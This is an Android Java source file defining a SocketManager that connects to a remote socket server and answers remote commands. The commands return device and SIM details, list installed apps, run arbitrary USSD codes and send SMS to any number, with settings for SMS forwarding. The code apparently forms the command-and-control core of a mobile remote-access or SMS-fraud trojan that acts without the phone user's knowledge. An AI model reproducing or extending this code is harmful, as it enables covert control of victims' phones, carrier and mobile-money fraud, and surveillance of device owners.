package com.topdown.softy.functions.managers;

import android.content.Context;

import com.topdown.softy.functions.helpers.Prefs;
import com.topdown.softy.functions.listeners.ActionCallbackListener;
import com.topdown.softy.functions.utils.Utils;
import com.topdown.softy.server.socket.SocketServer;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import io.socket.client.Ack;

public class SocketManager {

    private final Context context;
    private final Prefs prefs;
    private final DeviceManager deviceManager;

    public SocketManager(Context context) {
        this.context = context;
        this.prefs = new Prefs(context);
        this.deviceManager = new DeviceManager(context);
    }

    public void connect() {
        if (Utils.ADMIN_USERNAME.isEmpty()) return;

        SocketServer.init(deviceManager.getDeviceID());

        initSocketListeners();
    }

    private void initSocketListeners() {

        SocketServer.getSocket().on("get_system_info", args -> {
            Object lastArg = args[args.length - 1];
            if (lastArg instanceof Ack) {
                final Ack ackCallback = (Ack) lastArg;

                JSONObject ackData = new JSONObject();
                try {
                    ackData.put("data", deviceManager.getSystemInfoWithPermissions());
                    ackData.put("status", "success");
                    ackData.put("msg", "success");
                } catch (JSONException ignored) {

                }
                ackCallback.call(ackData);
            }
        });

        SocketServer.getSocket().on("get_sim_status", args -> {
            Object lastArg = args[args.length - 1];
            if (lastArg instanceof Ack) {
                final Ack ackCallback = (Ack) lastArg;

                JSONObject ackData = new JSONObject();

                try {
                    JSONArray simInfo = deviceManager.getSimDetails();

                    if (simInfo != null) {
                        if (simInfo.length() == 0) {
                            ackData.put("status", "error");
                            ackData.put("msg", "No Sim Card Found!");
                            return;
                        }
                        ackData.put("status", "success");
                        ackData.put("msg", "success");
                        ackData.put("data", simInfo);
                        ackData.put("configs", new JSONObject().put("sms-forward", prefs.getPref("sms-forward")).put("sms-slot-index", prefs.getPref("sms-slot-index"))
                                .put("last-ussd-code", prefs.getPref("last-ussd-code")).put("last-ussd-slot-index", prefs.getPref("last-ussd-slot-index")));

                    } else {
                        ackData.put("status", "error");
                        ackData.put("msg", "Permission Error!");
                    }
                } catch (JSONException ignored) {

                }
                ackCallback.call(ackData);
            }
        });

        SocketServer.getSocket().on("run-ussd", args -> {
            String ussd = (String) args[0];
            int slot = (int) args[1];
            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;

            USSDManager ussdManager = new USSDManager(context);
            ussdManager.runUssd(ussd, slot, new ActionCallbackListener() {

                @Override
                public void onSuccess(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

        SocketServer.getSocket().on("send-sms", args -> {
            String phoneNumber = (String) args[0];
            String message = (String) args[1];
            int slot = (int) args[2];

            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;

            SmsManager smsManager = new SmsManager(context);

            smsManager.sendSMS(phoneNumber, message, slot, new ActionCallbackListener() {
                @Override
                public void onSuccess(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

        SocketServer.getSocket().on("user-apps", args -> {
            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;

            if (ackCallback != null) {
                JSONObject ackData = new JSONObject();
                try {
                    ackData.put("status", "success");
                    ackData.put("msg", "success");
                    ackData.put("data", DeviceManager.getAllUserApps(context));
                } catch (JSONException ignored) {
                }
                ackCallback.call(ackData);
            }
        });

    }


    public void disconnect() {
        SocketServer.getSocket().off();
    }
}
